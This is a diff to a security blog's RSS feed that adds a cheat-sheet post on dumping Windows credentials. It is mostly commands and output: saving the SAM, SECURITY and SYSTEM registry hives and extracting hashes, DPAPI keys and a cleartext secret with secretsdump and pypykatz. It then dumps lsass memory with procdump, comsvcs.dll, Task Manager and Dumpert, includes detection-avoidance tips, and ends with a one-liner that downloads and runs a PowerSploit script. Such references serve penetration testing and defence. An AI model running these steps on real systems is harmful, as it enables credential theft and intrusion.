@@ -6,8 +6,136 @@
         <description>Recent content in Posts on Kaluche</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 08 Feb 2020 17:21:41 +0100</lastBuildDate>
+        <lastBuildDate>Tue, 01 Sep 2020 14:01:17 +0200</lastBuildDate>
         <atom:link href="https://kaluche.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Dumping credentials (offline)</title>
+            <link>https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/</link>
+            <pubDate>Tue, 01 Sep 2020 14:01:17 +0200</pubDate>
+            
+            <guid>https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/</guid>
+            <description>&lt;blockquote&gt;
+&lt;p&gt;Dumping creds for offline analysis&lt;/p&gt;
+&lt;/blockquote&gt;</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>Dumping creds for offline analysis</p>
+</blockquote>
+
+<h2 id="registry-hives-sam-lsa-secrets-cached-domain">Registry Hives (SAM/LSA Secrets/Cached Domain)</h2>
+
+<h3 id="dump-on-the-windows-machine">Dump on the windows machine</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">reg.exe save hklm\sam %TEMP%/sam.save
+reg.exe save hklm\security %TEMP%\security.save
+reg.exe save hklm\system %TEMP%\system.save</code></pre></div>
+<h3 id="with-secretdumps">With secretdumps</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">./</span>secretsdump<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>sam <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>dump<span style="color:#f92672">/</span>sam<span style="color:#f92672">.</span>save <span style="color:#f92672">-</span>security <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>dump<span style="color:#f92672">/</span>security<span style="color:#f92672">.</span>save <span style="color:#f92672">-</span>system <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>dump<span style="color:#f92672">/</span>system<span style="color:#f92672">.</span>save LOCAL
+Impacket v0<span style="color:#f92672">.</span><span style="color:#ae81ff">9.21</span><span style="color:#f92672">.</span>dev1<span style="color:#f92672">+</span><span style="color:#ae81ff">20200225.153700</span><span style="color:#f92672">.</span>afe746d2 <span style="color:#f92672">-</span> Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+[<span style="color:#f92672">*</span>] Target system bootKey: <span style="color:#ae81ff">0x3e62535704cdbf03f05168d943856689</span>
+[<span style="color:#f92672">*</span>] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+john<span style="color:#f92672">.</span>adm:<span style="color:#ae81ff">500</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">8846</span>f7eaee8fb117ad06bdd830b7586c:::
+Invité:<span style="color:#ae81ff">501</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:<span style="color:#ae81ff">503</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:<span style="color:#ae81ff">504</span>:aad3b435b51404eeaad3b435b51404ee:fc4ff20fd7d08f3f00edbca1bc29d7a0:::
+user:<span style="color:#ae81ff">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
+user1:<span style="color:#ae81ff">1020</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">8846</span>f7eaee8fb117ad06bdd830b7586c:::
+limited:<span style="color:#ae81ff">1021</span>:aad3b435b51404eeaad3b435b51404ee:<span style="color:#ae81ff">8846</span>f7eaee8fb117ad06bdd830b7586c:::
+[<span style="color:#f92672">*</span>] Dumping cached domain logon information (domain<span style="color:#f92672">/</span>username:hash)
+[<span style="color:#f92672">*</span>] Dumping LSA Secrets
+[<span style="color:#f92672">*</span>] DPAPI_SYSTEM 
+dpapi_machinekey:<span style="color:#ae81ff">0xf12c15bfbe9cedca364296f5c758b7c8f3029261</span>
+dpapi_userkey:<span style="color:#ae81ff">0x644ac66a4694f6bad0c5d9d7d745dbc7053ca4d5</span>
+[<span style="color:#f92672">*</span>] NL<span style="color:#960050;background-color:#1e0010">$</span>KM 
+ <span style="color:#ae81ff">0000</span>   <span style="color:#ae81ff">5</span>D C6 <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">2</span>D <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">67</span>  AF FE C4 F1 <span style="color:#ae81ff">02</span> D9 <span style="color:#ae81ff">1</span>A <span style="color:#ae81ff">95</span>   ]<span style="color:#f92672">.</span><span style="color:#ae81ff">8</span>i0<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>g<span style="color:#f92672">........</span>
+ <span style="color:#ae81ff">0010</span>   <span style="color:#ae81ff">54</span> A2 <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">20</span> CA <span style="color:#ae81ff">7</span>A A1  <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">05</span> E5 D2 <span style="color:#ae81ff">6</span>B <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">56</span> C9   T<span style="color:#f92672">.</span>D<span style="color:#f92672">.</span> <span style="color:#f92672">.</span>z<span style="color:#f92672">.....</span>k<span style="color:#a6e22e">@V.</span>
+ <span style="color:#ae81ff">0020</span>   F6 EC E6 ED <span style="color:#ae81ff">5</span>F FC <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">4</span>E <span style="color:#ae81ff">30</span> D9 A3 <span style="color:#ae81ff">40</span> E7 <span style="color:#ae81ff">01</span> E2   <span style="color:#f92672">....</span>_<span style="color:#f92672">.</span>wHN0<span style="color:#f92672">..</span><span style="color:#a6e22e">@...</span>
+ <span style="color:#ae81ff">0030</span>   <span style="color:#ae81ff">4</span>C <span style="color:#ae81ff">51</span> C3 F3 <span style="color:#ae81ff">2</span>B <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">5</span>E <span style="color:#ae81ff">0</span>B  <span style="color:#ae81ff">2</span>C <span style="color:#ae81ff">8</span>C CE <span style="color:#ae81ff">6</span>A <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">0</span>F <span style="color:#ae81ff">6</span>E E8   LQ<span style="color:#f92672">....^.</span>,<span style="color:#f92672">..</span>jp<span style="color:#f92672">.</span>n<span style="color:#f92672">.</span>
+NL<span style="color:#960050;background-color:#1e0010">$</span>KM:<span style="color:#ae81ff">5</span>dc63869302d1367affec4f102d91a9554a2449620ca7aa18505e5d26b4056c1f6ece1ed3ffc77484e30d9a340e701e24c51c3f31b075e0b2c8cce6a700f6ee8
+[<span style="color:#f92672">*</span>] _SC_PDQInventory 
+(Unknown User):Password1
+[<span style="color:#f92672">*</span>] Cleaning up<span style="color:#f92672">...</span> </code></pre></div>
+<h3 id="with-pypykatz">With pypykatz</h3>
+
+<p>Note: pip3 install pypykatz (<a href="https://github.com/skelsec/pypykatz" target="_blank">source</a>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ pypykatz registry system.save --sam sam.save --security security.save</code></pre></div>
+<h2 id="lsass-exe">lsass.exe</h2>
+
+<h3 id="1-procdump">1. Procdump</h3>
+
+<p>You can use the PID of the process to avoid some detection.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># DUMP</span>
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\u</span>ser<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt;tasklist | findstr /i lsas
+lsass.exe                      <span style="color:#ae81ff">636</span> Services                   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">748</span> Ko
+
+<span style="color:#75715e"># NAME</span>
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\u</span>ser<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt;procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+<span style="color:#75715e"># PID</span>
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\u</span>ser<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt;procdump64.exe -accepteula -ma <span style="color:#ae81ff">636</span> <span style="color:#ae81ff">636</span>.dmp
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span>-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+<span style="color:#f92672">[</span><span style="color:#ae81ff">14</span>:29:50<span style="color:#f92672">]</span> Dump <span style="color:#ae81ff">1</span> initiated: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\u</span>ser<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\6</span><span style="color:#ae81ff">36</span>.dmp
+<span style="color:#f92672">[</span><span style="color:#ae81ff">14</span>:29:51<span style="color:#f92672">]</span> Dump <span style="color:#ae81ff">1</span> writing: Estimated dump file size is <span style="color:#ae81ff">41</span> MB.
+<span style="color:#f92672">[</span><span style="color:#ae81ff">14</span>:29:51<span style="color:#f92672">]</span> Dump <span style="color:#ae81ff">1</span> complete: <span style="color:#ae81ff">41</span> MB written in <span style="color:#ae81ff">0</span>.1 seconds
+<span style="color:#f92672">[</span><span style="color:#ae81ff">14</span>:29:51<span style="color:#f92672">]</span> Dump count reached.</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># use with mimikatz</span>
+$ mimikatz.exe <span style="color:#e6db74">&#34;sekurlsa::minidump c:\temp\lsass.dmp&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonpasswords&#34;</span>
+
+<span style="color:#75715e"># use with pypykatz</span>
+$ pypykatz lsa minidump lsass.dmp</code></pre></div>
+<h3 id="2-comsvcs-dll">2. comsvcs.dll</h3>
+
+<p>Note: You need administrative AND debug privileges to dump with comsvc.dll. Powershell has theses privs by default. (<a href="https://risksense.com/blog/hidden-gems-in-windows-the-hunt-is-on/" target="_blank">source</a>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># DUMP</span>
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\u</span>ser<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt;tasklist | findstr /i lsas
+lsass.exe                      <span style="color:#ae81ff">636</span> Services                   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">748</span> Ko
+
+powershell -c rundll32.exe C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>omsvcs.dll, MiniDump <span style="color:#ae81ff">636</span> %TEMP%<span style="color:#ae81ff">\l</span>sass.dmp full</code></pre></div>
+<h3 id="3-task-manager">3. Task manager</h3>
+
+<p>Open task manager as admin, right click lsass.exe (or Local Security Authority Process), create dump, done. ¯\<em>(ツ)</em>/¯</p>
+
+<h3 id="4-out-minidump-ps1">4. Out-Minidump.ps1</h3>
+
+<p>Link : <a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1" target="_blank">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#39;); Get-Process lsass | out-minidump&#34;</span></code></pre></div>
+<h3 id="5-dumpert">5. Dumpert</h3>
+
+<p>Link : <a href="https://github.com/outflanknl/Dumpert" target="_blank">https://github.com/outflanknl/Dumpert</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Output : C:\WINDOWS\Temp\dumpert.dmp</span>
+<span style="color:#75715e"># exe</span>
+C<span style="color:#960050;background-color:#1e0010">:</span>\WINDOWS\system32&gt; C<span style="color:#960050;background-color:#1e0010">:</span>\temp\Outflank-Dumpert.exe
+ ________          __    _____.__                 __
+ \_____  \  __ ___/  |__/ ____\  | _____    ____ |  | __
+  /   |   \|  |  \   __\   __\|  | \__  \  /    \|  |/ /
+ /    |    \  |  /|  |  |  |  |  |__/ __ \|   |  \    &lt;
+ \_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \
+         \/                             \/     \/     \/
+                                  Dumpert
+                               By Cneeliz @Outflank 2019
+
+[1] Checking OS version details<span style="color:#960050;background-color:#1e0010">:</span>
+        [+] Operating System is Windows 10 or Server 2016, build number 18363
+        [+] Mapping version specific System calls.
+[2] Checking <span style="color:#66d9ef">Process</span> details<span style="color:#960050;background-color:#1e0010">:</span>
+        [+] <span style="color:#66d9ef">Process</span> ID of lsass.exe is<span style="color:#960050;background-color:#1e0010">:</span> 928
+        [+] NtReadVirtualMemory <span style="color:#66d9ef">function</span> pointer at<span style="color:#960050;background-color:#1e0010">:</span> 0x00007FFDEADBEEF
+        [+] NtReadVirtualMemory System call nr is<span style="color:#960050;background-color:#1e0010">:</span> 0x3f
+        [+] Unhooking NtReadVirtualMemory.
+[3] Create memorydump file<span style="color:#960050;background-color:#1e0010">:</span>
+        [+] Open a <span style="color:#66d9ef">process</span> handle.
+        [+] Dump lsass.exe memory to<span style="color:#960050;background-color:#1e0010">:</span> \??\C<span style="color:#960050;background-color:#1e0010">:</span>\WINDOWS\Temp\dumpert.dmp
+        [+] Dump succesful.
+
+<span style="color:#75715e"># dll (silent, no output)</span>
+rundll32.exe  C<span style="color:#960050;background-color:#1e0010">:</span>\Users\kaluche\Desktop\Dumpert-master\Dumpert-master\Dumpert-DLL\x64\Debug\Outflank-Dumpert-DLL.dll, Dump</code></pre></div>
+<h2 id="ntds-dit">NTDS.dit</h2>
+
+<p>Todo &hellip;</p>]]></content>
+        </item>
         
         <item>
             <title>Powershell</title>
